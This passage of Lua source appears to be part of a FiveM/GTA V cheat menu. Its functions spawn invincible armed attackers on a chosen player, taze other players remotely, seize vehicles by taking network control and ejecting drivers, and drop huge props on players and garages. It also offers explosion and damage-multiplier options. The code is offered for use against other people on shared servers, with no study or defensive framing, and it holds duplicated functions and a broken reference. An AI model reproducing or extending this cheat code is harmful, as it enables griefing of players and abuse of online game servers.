	{'WEAPON_GRENADELAUNCHER', '<font color="#66666A">Grenade Launcher', nil, nil, "heavyweapons"},
	{'weapon_grenadelauncher_smoke', '<font color="#66666A">Grenade Launcher (Smoke)', nil, nil, "heavyweapons"},
	{'weapon_minigun', '<font color="#66666A">Minigun', nil, nil, "heavyweapons"},
	{'weapon_firework', '<font color="#66666A">Firework Launcher', nil, nil, "heavyweapons"},
	{'weapon_railgun', '<font color="#66666A">Railgun', nil, nil, "heavyweapons"},
	{'weapon_hominglauncher', '<font color="#66666A">Homing Launcher', nil, nil, "heavyweapons"},
	{'weapon_compactlauncher', '<font color="#66666A">Compact Grenade Launcher', nil, nil, "heavyweapons"},
	{'weapon_rayminigun', '<font color="#66666A">Widowmaker', nil, nil, "heavyweapons"},
}


spawnEnemies = function(target, model)
	local wep = "WEAPON_ASSAULTRIFLE"
	for i = 0, 5 do
		local coords = GetEntityCoords(target)
		RequestModel(GetHashKey(model))
		Citizen.Wait(50)
		if HasModelLoaded(GetHashKey(model)) then
			local ped = CreatePed(21, GetHashKey(model),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(model),coords.x - i, coords.y + i, coords.z, 0, true, true)
			NetworkRegisterEntityAsNetworked(ped)
			Citizen.CreateThread(function()
				if DoesEntityExist(ped) and not IsEntityDead(target) then
					local netped = PedToNet(ped)
					NetworkSetNetworkIdDynamic(netped, false)
					SetNetworkIdCanMigrate(netped, true)
					SetNetworkIdExistsOnAllMachines(netped, true)
					Citizen.Wait(100)
					NetToPed(netped)
					GiveWeaponToPed(ped, GetHashKey(wep), 9999, 1, 1)
					SetEntityInvincible(ped, true)
					SetPedCanSwitchWeapon(ped, true)
					TaskCombatPed(ped, target, 0,16)
				elseif IsEntityDead(target) then
					TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
				else
					Citizen.Wait(0)
				end
			end)
		end
	end
end


spawnEnemies = function(target, model)
	local wep = "WEAPON_ASSAULTRIFLE"
	for i = 0, 5 do
		local coords = GetEntityCoords(target)
		RequestModel(GetHashKey(model))
		Citizen.Wait(50)
		if HasModelLoaded(GetHashKey(model)) then
			local ped = CreatePed(21, GetHashKey(model),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(model),coords.x - i, coords.y + i, coords.z, 0, true, true)
			NetworkRegisterEntityAsNetworked(ped)
			Citizen.CreateThread(function()
				if DoesEntityExist(ped) and not IsEntityDead(target) then
					local netped = PedToNet(ped)
					NetworkSetNetworkIdDynamic(netped, false)
					SetNetworkIdCanMigrate(netped, true)
					SetNetworkIdExistsOnAllMachines(netped, true)
					Citizen.Wait(100)
					NetToPed(netped)
					GiveWeaponToPed(ped, GetHashKey(wep), 9999, 1, 1)
					SetEntityInvincible(ped, true)
					SetPedCanSwitchWeapon(ped, true)
					TaskCombatPed(ped, target, 0,16)
				elseif IsEntityDead(target) then
					TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
				else
					Citizen.Wait(0)
				end
			end)
		end
	end
end

RequestWeaponAsset(`WEAPON_STUNGUN`) -- Fix1

local function TazePlayer(player)
	local ped = GetPlayerPed(player)
	local tLoc = GetEntityCoords(ped)

	local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
	local origin = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)



	ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
end

local onlinePlayerSelected = {} -- used for Online Players menu

local function KeyboardInput(title, initialText, bufferSize)
	local editing, finished, cancelled, notActive = 0, 1, 2, 3

	AddTextEntry("keyboard_title_buffer", title)
	DisplayOnscreenKeyboard(0, "keyboard_title_buffer", "", initialText, "", "", "", bufferSize)

	while UpdateOnscreenKeyboard() == editing do
		HideHudAndRadarThisFrame()
		Wait(0)
	end

	if GetOnscreenKeyboardResult() then return GetOnscreenKeyboardResult() end
end



local SliderOptions = {}

SliderOptions.FastRun = {
	Selected = 1,
	Values = {1.0, 1.09, 1.19, 1.29, 1.39, 1.49, 5.10},
	Words = {'<font color="#66666A">Default', "+20%", "+40%", "+60%", "+80%", "+100%", "+500%"},
}

SliderOptions.DamageModifier = {
	Selected = 1,
	Values = {1.0, 2.0, 5.0, 10.0, 25.0, 50.0, 100.0, 200.0, 500.0, 1000.0, 2000.0, 5000.0, 10000.0, 20000.0, 50000.0},
	Words = {"Default", "2x", "5x", "10x", "25x", "50x", "100x", "200x", "500x", "1000x", "2000x", "5000x", "10000x", "20000x", '<font color="#FF0000">50000x'}
}

local ComboOptions = {}

ComboOptions.ExplosionID = {
	Selected = 1,
	Values = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31", "32", "33", "34", "35"},
	Words = {"Grenade", "Grenade launcher", "Sticky bomb", "Molotov", "Rocket", "Tank shell", "Octane", "Car", "Plane", "Petrol pump", "Bike", "Steam", "Flame", "Water hydrant", "Gas canister", "Boat", "Ship destroy", "Truck", "Bullet", "Smoke Glauncher", "Smoke Grenade", "Bzgas", "Flare", "Gas canister", "Extinguisher", "Programmablear", "Train", "Barrel", "Propane", "Blimp", "Flame Explode", "Tanker", "Plane rocket", "Vehicle bullet", "Gas tank", "Bird crap"},
	}

ComboOptions.MK2 = {
	Selected = 1,
	Values = {"", "_mk2"},
	Words = {'~w~<font color="#66666A">Mk </font> <font color="#FFFFFF">I</font>', '<font color="#66666A">Mk </font> <font color="#00FF3A">II</font>'}
}

ComboOptions.Props = {
	Selected = 1,
	Values = {"cs2_08_ghost", "ch3_01_dino", "lts_prop_lts_elecbox_24", "p_crahsed_heli_s", "hei_prop_crate_stack_01", "cs_x_rubweed", "des_fibstair_root", "p_dumpster_t", "p_oil_pjack_02_s", "hei_prop_heist_tug", "p_tram_crash_s", "prop_air_monhut_03_cr", "prop_carwash_roller_vert", "prop_cs_beachtowel_01"},
	Words = {"Ghost", "Dino", "El-Box", "Chopper", "Box", "Stone", "Stairs", "Trash", "Oil Rig", "Boat", "Tram", "Container", "Brush", "Towel"}
}

ComboOptions.EnginePower = {
	Selected = 1,
	Values = {1.0, 25.0, 50.0, 100.0, 200.0, 500.0, 1000.0, 2000.0, 3000.0, 4000.0, 5000.0},
	Words = {'<font color="#66666A">Default', '<font color="#8D8D8C">+25%', '<font color="#C6C6C6">+50%', '<font color="#FFFFFF">+100%', '<font color="#A23C93">+200%', '<font color="#C631B0">+500%', '<font color="#FF00D9">+1000%', '<font color="#A92D2D">+2000%', '<font color="#CD1717">+3000%', '<font color="#FF0000">+4000%', '<font color="#F3FF00">+5000%'}
}

ComboOptions.XenonColor = {
	Selected = 1,
	Values = {-1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12},
	Words = {'<font color="#66666A">Default', "White", "Blue", "Electric", "Mint", "Lime", "Yellow", "Gold", "Orange", "Red", "Pink", "Hot Pink", "Purple", "Blacklight"}
}

ComboOptions.BigProps = {
    Selected = 1,
    Values = {"cs1_lod3_terrain_slod3_01", "cs4_lod_01_slod3", "apa_mp_apa_yacht", "cargoplane", "prop_storagetank_02b", "prop_pylon_01", "prop_windmill_01", "dt1_19_lspd02_lod", "prop_towercrane_01a", "stt_prop_ramp_spiral_l", "prop_billboard_02", "prop_tree_cedar_s_04", "hw1_27_tcraneb_lod", "ap1_lod_slod4", "ch1_lod_slod3e", "dt1_11_dt1_tower", "ch2_03_sign_slod", "ch3_08_dam_mp2_o001", "hw1_09_emissive_c"},
    Words = {"Chilliad", "Sandy Shores", "Yacht", "Cargo plane", "Tanker", "Tower", "Windmill", "LSPD", "Crane", "Spiral", "Billboard","Tree", "Crane", "Airport", "Mountains", "Maze Bank", "VineWood", "Water Dam", "LSPD Vine"}
}

ComboOptions.BrikuleNaGarazich = {
    Selected = 1,
    Values = {"prop_container_ld2", "blista", "prop_med_jet_01", "prop_windmill_01", "stt_prop_hoop_tyre_01a", "bus", "kraken"},
    Words = {"Container", "Car", "Airplane", "Windmill", "Large wheel", "Bus", "Submarine"}
}
ComboOptions.BrikuleNaHracich = {
    Selected = 1,
    Values = {"prop_container_ld2", "blista", "prop_med_jet_01", "prop_windmill_01", "stt_prop_hoop_tyre_01a", "bus", "kraken"},
    Words = {"Container", "Car", "Airplane", "Windmill", "Large wheel", "Bus", "Submarine"}
}

ComboOptions.BrikuleNaPD = {
    Selected = 1,
    Values = {"prop_container_ld2", "blista", "prop_med_jet_01", "prop_windmill_01", "stt_prop_hoop_tyre_01a", "bus", "kraken"},
    Words = {"Container", "Car", "Airplane", "Windmill", "Large wheel", "Bus", "Submarine"}
}

ComboOptions.PropsOnPlayers = {
    Selected = 1,
    Values = {"cs1_lod3_terrain_slod3_01", "cs4_lod_01_slod3", "apa_mp_apa_yacht", "cargoplane", "prop_storagetank_02b", "prop_pylon_01", "prop_windmill_01", "dt1_19_lspd02_lod", "prop_towercrane_01a", "stt_prop_ramp_spiral_l", "prop_billboard_02", "prop_tree_cedar_s_04", "hw1_27_tcraneb_lod", "ap1_lod_slod4", "ch1_lod_slod3e", "dt1_11_dt1_tower", "ch2_03_sign_slod", "ch3_08_dam_mp2_o001", "hw1_09_emissive_c"},
    Words = {"Chilliad", "Sandy Shores", "Yacht", "Cargo plane", "Tanker", "Tower", "Windmill", "LSPD", "Crane", "Spiral", "Billboard","Tree", "Crane", "Airport", "Mountains", "Maze Bank", "VineWood", "Water Dam", "LSPD Vine"}
}

local function GetDirtLevel(vehicle)
	local x = GetVehicleDirtLevel(vehicle)
	local val = floor(((x / 7.5) + 1) + 0.5)
	
	return val
end

ComboOptions.DirtLevel = {
	Selected = GetDirtLevel,
	Values = {0.0, 7.5, 15.0},
	Words = {'<font color="#FFFFFF">Clean', '<font color="#A25A1E">Dirty', '<font color="#482D17">Filthy'}
}

local function RepairVehicle(vehicle)
	local vehicle = vehicle
	if vehicle == 0 then return false end

	RequestControlOnce(vehicle)
	SetVehicleFixed(vehicle)
	SetVehicleLightsMode(vehicle, 0)
	SetVehicleLights(vehicle, 0)
	SetVehicleBurnout(vehicle, false)
	SetVehicleEngineHealth(vehicle, 1000.0)
	SetVehicleFuelLevel(vehicle, 100.0)
	SetVehicleOilLevel(vehicle, 100.0)
	return true
end

local function RepairEngine(vehicle)
	local vehicle = vehicle
	if vehicle == 0 then return false end

	SetVehicleEngineHealth(vehicle, 1000.0)
	return true
	end 

local function FlipVehicle(vehicle)
	local vehicle = vehicle
	if vehicle == 0 then return false end

	return SetVehicleOnGroundProperly(vehicle)
end

local function GetVehicleInFrontOfMe()
	
	local playerPos = GetEntityCoords( PlayerPedId() )
	local inFront = GetOffsetFromEntityInWorldCoords( ped, 0.0, 8.0, 0.0 )
	local rayHandle = CastRayPointToPoint( playerPos.x, playerPos.y, playerPos.z, inFront.x, inFront.y, inFront.z, 10, PlayerPedId(), 0 )
    local _, _, _, _, vehicle = GetRaycastResult( rayHandle )
	
	return vehicle
end

local function RemoveVehicle(vehicle)
	SetEntityAsMissionEntity(vehicle, 1, 1)
	DeleteEntity(vehicle)
	SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
	DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
end

local function TeleportToPlayerVehicle(player)
	local ped = GetPlayerPed(player)
	if not IsPedInAnyVehicle(ped) then
		return takytemamrad.SendNotification({text = ("%s is not in a vehicle!"):format(GetPlayerName(player)), type = "error"})
	end

	local vehicle = GetVehiclePedIsUsing(GetPlayerPed(player))

	local seats = GetVehicleMaxNumberOfPassengers(vehicle)
	for i = 0, seats do
		if IsVehicleSeatFree(vehicle, i) then
			SetPedIntoVehicle(PlayerPedId(), vehicle, i)
			break
		end
	end
end

local function ChangeVehiclePlateText(vehicle)
	local plateText = KeyboardInput('~w~<font color="#4280C6">Put a car plate', "", 8)

	if vehicle ~= 0 then 
		SetVehicleNumberPlateText(vehicle, plateText)
		return true
	end

	return false
end

local function DriveVehicle(vehicle)
	if vehicle == 0 then
		vehicle = GetVehicleInFrontOfMe()
	end

	SetPedIntoVehicle(PlayerPedId(), vehicle, -1)
end

local function StealVehicle(vehicle)
	local ped = GetPedInVehicleSeat(vehicle, -1)
	local vehicleNet = VehToNet(vehicle)

	RequestControlOnce(ped)
	ClearPedTasksImmediately(ped)

	while not IsVehicleSeatFree(NetToVeh(vehicleNet), -1) do
		Wait(0)
	end

	SetPedIntoVehicle(PlayerPedId(), NetToVeh(vehicleNet), -1)
	TaskWarpPedIntoVehicle(PlayerPedId(), NetToVeh(vehicleNet), -1)

	return true
end

ComboOptions.VehicleActions = {
	Selected = 1,
	Values = {RepairVehicle, RepairEngine,FlipVehicle, DriveVehicle, RemoveVehicle},
	Words = {'<font color="#1BFF00">Repair', '<font color="#FFFFFF">Engine', '<font color="#FFFFFF">Flip', '<font color="#FFFFFF">Drive', '<font color="#FF0000">Delete'}
}

local currentMods = nil
local EngineUpgrade = {-1, 0, 1, 2, 3}
local VehicleUpgradeWords = {

	{'<font color="#66666A">STOCK', '<font color="#FF0000">MAX LEVEL'},
	{'<font color="#66666A">STOCK', '<font color="#992A5C">LEVEL 1', '<font color="#FF0000">MAX LEVEL'},
	{'<font color="#66666A">STOCK', '<font color="#992A5C">LEVEL 1', '<font color="#AB0CF0">LEVEL 2', '<font color="#FF0000">MAX LEVEL'},
	{'<font color="#66666A">STOCK', '<font color="#992A5C">LEVEL 1', '<font color="#AB0CF0">LEVEL 2', '<font color="#0CEDF0">LEVEL 3', '<font color="#FF0000">MAX LEVEL'},
	{'<font color="#66666A">STOCK', '<font color="#992A5C">LEVEL 1', '<font color="#AB0CF0">LEVEL 2', '<font color="#0CEDF0">LEVEL 3', '<font color="#58F00C">LEVEL 4', '<font color="#FF0000">MAX LEVEL'},

}

local themeColors = {
	dark = {type = "dark", r = 170, g = 170, b = 170, a = 255,
		menu = {
			frame = {r = 2, g = 2, b = 12}
		} 
	}, -- rgb(52, 152, 219)
	
	blue = {type = "blue", r = 0, g = 135, b = 255, a = 170,
	menu = {
		frame = {r = 2, g = 2, b = 12}
	} 
}, 

	green = {type = "green", r = 0, g = 255, b = 0, a = 185,
	menu = {
		frame = {r = 2, g = 2, b = 12}
	} 
}, 
	-- 
	red = {type = "red", r = 255, g = 0, b = 0, a = 255, 
		menu = {
			frame = {r = 135, g = 135, b = 145}
		}
	}, 
}
-- Set a default menu theme
_menuColor.base = themeColors.dark

local dynamicColorTheme = false

local texture_preload = {
	"commonmenu",
	"heisthud",
	"mpweaponscommon",
	"commonmenutu",
	"helicopterhud",
	"mpshops",
	"mpweaponscommon_small",
	"mpweaponsgang0_small",
	"mpweaponsgang1_small",
	"mpweaponsgang0",
	"mpweaponsgang1",
    "mpweaponsunusedfornow",
	"shopui_title_graphics_franklin",
	"mpleaderboard",
	"mphud",
	"mparrow",
	"pilotschool",
	"shared",
	"triathlon",
	"mplobby",
}

local function PreloadTextures()
	
	--debugprint("^7Preloading texture dictionaries...")
	for i = 1, #texture_preload do
		RequestStreamedTextureDict(texture_preload[i])
	end

end

PreloadTextures()

local function KillYourselfThread()
	local playerPed = PlayerPedId()
	local canSuicide = false
	local foundWeapon = nil

	GiveWeaponToPed(playerPed, GetHashKey("WEAPON_PISTOL"), 250, false, true)

	if HasPedGotWeapon(playerPed, GetHashKey('WEAPON_PISTOL')) then
		if GetAmmoInPedWeapon(playerPed, GetHashKey('WEAPON_PISTOL')) > 0 then
			canSuicide = true
			foundWeapon = GetHashKey('WEAPON_PISTOL')
		end
	end

	if canSuicide then
		if not HasAnimDictLoaded('mp_suicide') then
			RequestAnimDict('mp_suicide')

			while not HasAnimDictLoaded('mp_suicide') do
				Wait(0)
			end
		end

		SetCurrentPedWeapon(playerPed, foundWeapon, true)

		Wait(1000)

		TaskPlayAnim(playerPed, "mp_suicide", "pistol", 8.0, 1.0, -1, 2, 0, 0, 0, 0 )

		Wait(750)

		SetPedShootsAtCoord(playerPed, 0.0, 0.0, 0.0, 0)
		SetEntityHealth(playerPed, 0)
	end
end

local validResources = {}
local validResourceEvents = {}
local validResourceServerEvents = {}

local function KillYourself()
	CreateThread(KillYourselfThread)
end

local function RotationToDirection(rotation)
    local retz = math.rad(rotation.z)
    local retx = math.rad(rotation.x)
    local absx = math.abs(math.cos(retx))
    return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
end

local function SelfRagdollThread()
	while Cya.Toggle.SelfRagdoll do
		SetPedToRagdoll(PlayerPedId(), 1000, 1000, 0, 0, 0, 0)
		Wait(5)
	end
end

local function SelfRagdoll()
	Cya.Toggle.SelfRagdoll = not Cya.Toggle.SelfRagdoll

	if Cya.Toggle.SelfRagdoll then
		CreateThread(SelfRagdollThread)
	end
end

local function clonePedOutfit(me, ped)
	
	hat = GetPedPropIndex(ped, 0)
	hat_texture = GetPedPropTextureIndex(ped, 0)
	
	glasses = GetPedPropIndex(ped, 1)
	glasses_texture = GetPedPropTextureIndex(ped, 1)
	
	ear = GetPedPropIndex(ped, 2)
	ear_texture = GetPedPropTextureIndex(ped, 2)
	
	watch = GetPedPropIndex(ped, 6)
	watch_texture = GetPedPropTextureIndex(ped, 6)
	
	wrist = GetPedPropIndex(ped, 7)
	wrist_texture = GetPedPropTextureIndex(ped, 7)
	
	head_drawable = GetPedDrawableVariation(ped, 0)
	head_palette = GetPedPaletteVariation(ped, 0)
	head_texture = GetPedTextureVariation(ped, 0)
	
	beard_drawable = GetPedDrawableVariation(ped, 1)
	beard_palette = GetPedPaletteVariation(ped, 1)
	beard_texture = GetPedTextureVariation(ped, 1)
	
	hair_drawable = GetPedDrawableVariation(ped, 2)
	hair_palette = GetPedPaletteVariation(ped, 2)
	hair_texture = GetPedTextureVariation(ped, 2)
	
	torso_drawable = GetPedDrawableVariation(ped, 3)
	torso_palette = GetPedPaletteVariation(ped, 3)
	torso_texture = GetPedTextureVariation(ped, 3)
	
	legs_drawable = GetPedDrawableVariation(ped, 4)
	legs_palette = GetPedPaletteVariation(ped, 4)
	legs_texture = GetPedTextureVariation(ped, 4)
	
	hands_drawable = GetPedDrawableVariation(ped, 5)
	hands_palette = GetPedPaletteVariation(ped, 5)
	hands_texture = GetPedTextureVariation(ped, 5)
	
	foot_drawable = GetPedDrawableVariation(ped, 6)
	foot_palette = GetPedPaletteVariation(ped, 6)
	foot_texture = GetPedTextureVariation(ped, 6)
	
	acc1_drawable = GetPedDrawableVariation(ped, 7)
	acc1_palette = GetPedPaletteVariation(ped, 7)
	acc1_texture = GetPedTextureVariation(ped, 7)
	
	acc2_drawable = GetPedDrawableVariation(ped, 8)
	acc2_palette = GetPedPaletteVariation(ped, 8)
	acc2_texture = GetPedTextureVariation(ped, 8)
	
	acc3_drawable = GetPedDrawableVariation(ped, 9)
	acc3_palette = GetPedPaletteVariation(ped, 9)
	acc3_texture = GetPedTextureVariation(ped, 9)
	
	mask_drawable = GetPedDrawableVariation(ped, 10)
	mask_palette = GetPedPaletteVariation(ped, 10)
	mask_texture = GetPedTextureVariation(ped, 10)
	
	aux_drawable = GetPedDrawableVariation(ped, 11)
	aux_palette = GetPedPaletteVariation(ped, 11) 	
	aux_texture = GetPedTextureVariation(ped, 11)

	SetPedPropIndex(me, 0, hat, hat_texture, 1)
	SetPedPropIndex(me, 1, glasses, glasses_texture, 1)
	SetPedPropIndex(me, 2, ear, ear_texture, 1)
	SetPedPropIndex(me, 6, watch, watch_texture, 1)
	SetPedPropIndex(me, 7, wrist, wrist_texture, 1)
	
	SetPedComponentVariation(me, 0, head_drawable, head_texture, head_palette)
	SetPedComponentVariation(me, 1, beard_drawable, beard_texture, beard_palette)
	SetPedComponentVariation(me, 2, hair_drawable, hair_texture, hair_palette)
	SetPedComponentVariation(me, 3, torso_drawable, torso_texture, torso_palette)
	SetPedComponentVariation(me, 4, legs_drawable, legs_texture, legs_palette)
	SetPedComponentVariation(me, 5, hands_drawable, hands_texture, hands_palette)
	SetPedComponentVariation(me, 6, foot_drawable, foot_texture, foot_palette)
	SetPedComponentVariation(me, 7, acc1_drawable, acc1_texture, acc1_palette)
	SetPedComponentVariation(me, 8, acc2_drawable, acc2_texture, acc2_palette)
	SetPedComponentVariation(me, 9, acc3_drawable, acc3_texture, acc3_palette)
	SetPedComponentVariation(me, 10, mask_drawable, mask_texture, mask_palette)
	SetPedComponentVariation(me, 11, aux_drawable, aux_texture, aux_palette)
end

-- Config for LSC
local LSC = {}

LSC.vehicleMods = {{name = "Spoilers", id = 0, meta = "modSpoilers"},{name = "Front Bumper", id = 1, meta = "modFrontBumper"},{name = "Rear Bumper", id = 2, meta = "modRearBumper"},{name = "Side Skirt", id = 3, meta = "modSideSkirt"},{name = "Exhaust", id = 4, meta = "modExhaust"},{name = "Frame", id = 5, meta = "modFrame"},{name = "Grille", id = 6, meta = "modGrille"},{name = "Hood", id = 7, meta = "modHood"},{name = "Fender", id = 8, meta = "modFender"},{name = "Right Fender", id = 9, meta = "modRightFender"},{name = "Roof", id = 10, meta = "modRoof"},{name = "Xenon Lights", id = 22, meta = "modXenon"},{name = "Vanity Plates", id = 26, meta = "modVanityPlate"},{name = "Trim", id = 27, meta = "modTrim"},{name = "Ornaments", id = 28, meta = "modOrnaments"},{name = "Dashboard", id = 29, meta = "modDashboard"},{name = "Dial", id = 30, meta = "modDial"},{name = "Door Speaker", id = 31, meta = "modDoorSpeaker"},{name = "Seats", id = 32, meta = "modSeats"},{name = "Steering Wheel", id = 33, meta = "modSteeringWheel"},{name = "Shifter Leavers", id = 34, meta = "modShifterLeavers"},{name = "Plaques", id = 35, meta = "modPlaques"},{name = "Speakers", id = 36, meta = "modSpeakers"},{name = "Trunk", id = 37, meta = "modTrunk"},{name = "Hydraulics", id = 38, meta = "modHydraulics"},{name = "Engine Block", id = 39, meta = "modEngineBlock"},{name = "Air Filter", id = 40, meta = "modAirFilter"},{name = "Struts", id = 41, meta = "modStruts"},{name = "Arch Cover", id = 42, meta = "modArchCover"},{name = "Aerials", id = 43, meta = "modAerials"},{name = "Trim 2", id = 44, meta = "modTrimB"},{name = "Tank", id = 45, meta = "modTank"},{name = "Windows", id = 46, meta = "modWindows"},{name = "Livery", id = 48, meta = "modLivery"},{name = "Horns", id = 14, meta = "modHorns"},{name = "Wheels", id = 23, meta = "modFrontWheels"},{name = "Back Wheels", id = 24, meta = "modBackWheels"},}

LSC.perfMods = {{name = "Armor", id = 16, meta = "modArmor"},{name = "Engine", id = 11, meta = "modEngine"},{name = "Brakes", id = 12, meta = "modBrakes"},{name = "Transmission", id = 13, meta = "modTransmission"},{name = "Suspension", id = 15, meta = "modSuspension"},}

LSC.horns = {
	["HORN_STOCK"] = -1,
	["Truck Horn"] = 1,
	["Police Horn"] = 2,
	["Clown Horn"] = 3,
	["Musical Horn 1"] = 4,
	["Musical Horn 2"] = 5,
	["Musical Horn 3"] = 6,
	["Musical Horn 4"] = 7,
	["Musical Horn 5"] = 8,
	["Sad Trombone Horn"] = 9,
	["Classical Horn 1"] = 10,
	["Classical Horn 2"] = 11,
	["Classical Horn 3"] = 12,
	["Classical Horn 4"] = 13,
	["Classical Horn 5"] = 14,
	["Classical Horn 6"] = 15,
	["Classical Horn 7"] = 16,
	["Scaledo Horn"] = 17,
	["Scalere Horn"] = 18,
	["Salemi Horn"] = 19,
	["Scalefa Horn"] = 20,
	["Scalesol Horn"] = 21,
	["Scalela Horn"] = 22,
	["Scaleti Horn"] = 23,
	["Scaledo Horn High"] = 24,
	["Jazz Horn 1"] = 25,
	["Jazz Horn 2"] = 26,
	["Jazz Horn 3"] = 27,
	["Jazz Loop Horn"] = 28,
	["Starspangban Horn 1"] = 28,
	["Starspangban Horn 2"] = 29,
	["Starspangban Horn 3"] = 30,
	["Starspangban Horn 4"] = 31,
	["Classical Loop 1"] = 32,
	["Classical Horn 8"] = 33,
	["Classical Loop 2"] = 34,

}

LSC.WheelType = {"Sport", "Muscle", "Lowrider", "SUV", "Offroad", "Tuner", "Bike", "High End"}

LSC.neonColors = {
["White"] = {255,255,255},
["Blue"] ={0,0,255},
["Electric Blue"] ={0,150,255},
["Mint Green"] ={50,255,155},
["Lime Green"] ={0,255,0},
["Yellow"] ={255,255,0},
["Golden Shower"] ={204,204,0},
["Orange"] ={255,128,0},
["Red"] ={255,0,0},
["Pony Pink"] ={255,102,255},
["Hot Pink"] ={255,0,255},
["Purple"] ={153,0,153},
}

LSC.paintsClassic = {{name = "Black", id = 0},{name = "Carbon Black", id = 147},{name = "Graphite", id = 1},{name = "Anhracite Black", id = 11},{name = "Black Steel", id = 2},{name = "Dark Steel", id = 3},{name = "Silver", id = 4},{name = "Bluish Silver", id = 5},{name = "Rolled Steel", id = 6},{name = "Shadow Silver", id = 7},{name = "Stone Silver", id = 8},{name = "Midnight Silver", id = 9},{name = "Cast Iron Silver", id = 10},{name = "Red", id = 27},{name = "Torino Red", id = 28},{name = "Formula Red", id = 29},{name = "Lava Red", id = 150},{name = "Blaze Red", id = 30},{name = "Grace Red", id = 31},{name = "Garnet Red", id = 32},{name = "Sunset Red", id = 33},{name = "Cabernet Red", id = 34},{name = "Wine Red", id = 143},{name = "Candy Red", id = 35},{name = "Hot Pink", id = 135},{name = "Pfsiter Pink", id = 137},{name = "Salmon Pink", id = 136},{name = "Sunrise Orange", id = 36},{name = "Orange", id = 38},{name = "Bright Orange", id = 138},{name = "Gold", id = 99},{name = "Bronze", id = 90},{name = "Yellow", id = 88},{name = "Race Yellow", id = 89},{name = "Dew Yellow", id = 91},{name = "Dark Green", id = 49},{name = "Racing Green", id = 50},{name = "Sea Green", id = 51},{name = "Olive Green", id = 52},{name = "Bright Green", id = 53},{name = "Gasoline Green", id = 54},{name = "Lime Green", id = 92},{name = "Midnight Blue", id = 141},{name = "Galaxy Blue", id = 61},{name = "Dark Blue", id = 62},{name = "Saxon Blue", id = 63},{name = "Blue", id = 64},{name = "Mariner Blue", id = 65},{name = "Harbor Blue", id = 66},{name = "Diamond Blue", id = 67},{name = "Surf Blue", id = 68},{name = "Nautical Blue", id = 69},{name = "Racing Blue", id = 73},{name = "Ultra Blue", id = 70},{name = "Light Blue", id = 74},{name = "Chocolate Brown", id = 96},{name = "Bison Brown", id = 101},{name = "Creeen Brown", id = 95},{name = "Feltzer Brown", id = 94},{name = "Maple Brown", id = 97},{name = "Beechwood Brown", id = 103},{name = "Sienna Brown", id = 104},{name = "Saddle Brown", id = 98},{name = "Moss Brown", id = 100},{name = "Woodbeech Brown", id = 102},{name = "Straw Brown", id = 99},{name = "Sandy Brown", id = 105},{name = "Bleached Brown", id = 106},{name = "Schafter Purple", id = 71},{name = "Spinnaker Purple", id = 72},{name = "Midnight Purple", id = 142},{name = "Bright Purple", id = 145},{name = "Cream", id = 107},{name = "Ice White", id = 111},{name = "Frost White", id = 112},}
LSC.paintsMatte = {{name = "Black", id = 12},{name = "Gray", id = 13},{name = "Light Gray", id = 14},{name = "Ice White", id = 131},{name = "Blue", id = 83},{name = "Dark Blue", id = 82},{name = "Midnight Blue", id = 84},{name = "Midnight Purple", id = 149},{name = "Schafter Purple", id = 148},{name = "Red", id = 39},{name = "Dark Red", id = 40},{name = "Orange", id = 41},{name = "Yellow", id = 42},{name = "Lime Green", id = 55},{name = "Green", id = 128},{name = "Forest Green", id = 151},{name = "Foliage Green", id = 155},{name = "Olive Darb", id = 152},{name = "Dark Earth", id = 153},{name = "Desert Tan", id = 154},}
LSC.paintsMetal = {{name = "Brushed Steel", id = 117},{name = "Brushed Black Steel", id = 118},{name = "Brushed Aluminum", id = 119},{name = "Pure Gold", id = 158},{name = "Brushed Gold", id = 159},}

function LSC.GetHornName(index)
	if (index == 0) then
		return "Truck Horn"
	elseif (index == 1) then
		return "Cop Horn"
	elseif (index == 2) then
		return "Clown Horn"
	elseif (index == 3) then
		return "Musical Horn 1"
	elseif (index == 4) then
		return "Musical Horn 2"
	elseif (index == 5) then
		return "Musical Horn 3"
	elseif (index == 6) then
		return "Musical Horn 4"
	elseif (index == 7) then
		return "Musical Horn 5"
	elseif (index == 8) then
		return "Sad Trombone"
	elseif (index == 9) then
		return "Classical Horn 1"
	elseif (index == 10) then
		return "Classical Horn 2"
	elseif (index == 11) then
		return "Classical Horn 3"
	elseif (index == 12) then
		return "Classical Horn 4"
	elseif (index == 13) then
		return "Classical Horn 5"
	elseif (index == 14) then
		return "Classical Horn 6"
	elseif (index == 15) then
		return "Classical Horn 7"
	elseif (index == 16) then
		return "Scale - Do"
	elseif (index == 17) then
		return "Scale - Re"
	elseif (index == 18) then
		return "Scale - Mi"
	elseif (index == 19) then
		return "Scale - Fa"
	elseif (index == 20) then
		return "Scale - Sol"
	elseif (index == 21) then
		return "Scale - La"
	elseif (index == 22) then
		return "Scale - Ti"
	elseif (index == 23) then
		return "Scale - Do"
	elseif (index == 24) then
		return "Jazz Horn 1"
	elseif (index == 25) then
		return "Jazz Horn 2"
	elseif (index == 26) then
		return "Jazz Horn 3"
	elseif (index == 27) then
		return "Jazz Horn Loop"
	elseif (index == 28) then
		return "Star Spangled Banner 1"
	elseif (index == 29) then
		return "Star Spangled Banner 2"
	elseif (index == 30) then
		return "Star Spangled Banner 3"
	elseif (index == 31) then
		return "Star Spangled Banner 4"
	elseif (index == 32) then
		return "Classical Horn 8 Loop"
	elseif (index == 33) then
		return "Classical Horn 9 Loop"
	elseif (index == 34) then
		return "Classical Horn 10 Loop"
	elseif (index == 35) then
		return "Classical Horn 8"
	elseif (index == 36) then
		return "Classical Horn 9"
	elseif (index == 37) then
		return "Classical Horn 10"
	elseif (index == 38) then
		return "Funeral Loop"
	elseif (index == 39) then
